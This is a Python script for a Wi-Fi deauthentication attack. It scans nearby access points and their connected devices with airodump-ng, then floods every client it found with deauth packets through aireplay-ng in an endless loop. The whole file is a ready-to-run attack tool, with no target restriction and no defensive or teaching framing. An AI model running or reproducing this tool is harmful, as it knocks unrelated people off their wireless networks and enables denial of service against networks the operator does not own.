import subprocess
import tempfile
import time
import argparse
import re
import json

def iface_monitor(iface):
	subprocess.call(['ifconfig', iface, 'down'])
	subprocess.call(['iwconfig', iface, 'mode', 'monitor']) 
	subprocess.call(['ifconfig', iface, 'up'])

def gather_ap_data(iface, s):
	f = tempfile.TemporaryFile()
	p = subprocess.Popen(['airodump-ng', iface], stdout=f, stderr=f)
	time.sleep(s)
	p.terminate()
	p.wait()

	f.seek(0)
	data = f.read()
	f.close()
	return data

def parse_aps(d):
	aps = {}

	ap_pattern = re.compile('^\s*([0-9A-Z]{2}:){5}[0-9A-Z]{2}[^:]*$')
	for l in d.split('\n'):
		if ap_pattern.match(l):
			l = l.split()
			aps[l[0]] = {'bssid': l[0], 'channel': l[5], 'essid': l[-1]}

	return aps

def gather_devices(iface, ap, s):
	f = tempfile.TemporaryFile()
	p = subprocess.Popen(['airodump-ng', '--bssid', ap['bssid'], '--channel', ap['channel'], iface], stdout=f, stderr=f) 
	time.sleep(s)
	p.terminate()
	p.wait()

	f.seek(0)
	data = f.read()
	f.close()
	return data

def parse_devices(d):
	devices = []

	device_pattern = re.compile('^(\s*([0-9A-Z]{2}:){5}[0-9A-Z]{2}){2}.*$')
	for l in d.split('\n'):
		if device_pattern.match(l):
			l = l.split()
			if l[1] not in devices:
				devices.append(l[1])

	return devices

def deauth(iface, packets, aps):
	print('[*] Starting DeAuth..')

	while True:
		for ap in aps:
			ap = aps[ap]
			if not ap['devices']:
				continue
			print('[*] Manually changing {0} to channel {1}'.format(iface, ap['channel']))
			subprocess.call(['iwconfig', iface, 'channel', ap['channel']]) 
			for device in ap['devices']:
				print('[*] Sending {0} DeAuth packets from {1} to {2} on channel {3}'.format(packets, device, ap['bssid'], ap['channel']))
				p = subprocess.call(['aireplay-ng', '-0', str(packets), '-a', ap['bssid'], '-c', device, iface])

def save(aps, f):
	with open(f, 'w') as fp:
		json.dump(aps, fp)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--interface', '-i', default='wlan0', type=str, help='Interface to be used')
	parser.add_argument('--stime', '-s', default=10, type=int, help='Time to scan near APs')
	parser.add_argument('--ctime', '-c', default=10, type=int, help='Time to scan devices for each AP')
	parser.add_argument('--packets', '-p', default=3, type=int, help='Number of DeAuth packets per device')
	parser.add_argument('--write', '-w', type=str, help='Write scanning to file')
	parser.add_argument('--load', '-l', type=str, help='Load previous scan')
	args = parser.parse_args()

	aps = {}
	devices_count = 0
	aps_count = 0

	if args.load:
		with open(args.load) as fp:
			aps = json.load(fp)
			deauth(args.interface, args.packets, aps)
			exit()

	print('[*] Setting up interface {0} to mode monitor..'.format(args.interface))
	iface_monitor(args.interface)

	print('[*] Gathering near APs data ({0} seconds)..'.format(args.stime))
	ap_data = gather_ap_data(args.interface, args.stime)
	aps = parse_aps(ap_data)

	print('[*] Gathered {0} APs. {1}'.format(len(aps), [ap for ap in aps]))

	if args.write:
		save(aps, args.write)

	for ap in aps:
		print('\n[*] Manually changing {0} channel to {1}..'.format(args.interface, aps[ap]['channel']))
		subprocess.call(['iwconfig', args.interface, 'channel', aps[ap]['channel']]) 
		print('[*] Gathering devices for AP {0}@{1} ({2}/{3} - {4} seconds remaining)..'.format(aps[ap]['essid'], ap, aps_count, len(aps), args.ctime * (len(aps) - aps_count)))
		devices_data = gather_devices(args.interface, aps[ap], args.ctime)
		aps[ap]['devices'] = parse_devices(devices_data)
		devices_count = devices_count + len(aps[ap]['devices'])
		print('[*] Gathered {0} devices. {1} Total of {2}.'.format(len(aps[ap]['devices']), [d for d in aps[ap]['devices']], devices_count))
		aps_count = aps_count + 1

		if args.write:
			save(aps, args.write)

	deauth(args.interface, args.packets, aps)

if __name__ == '__main__':
	main()
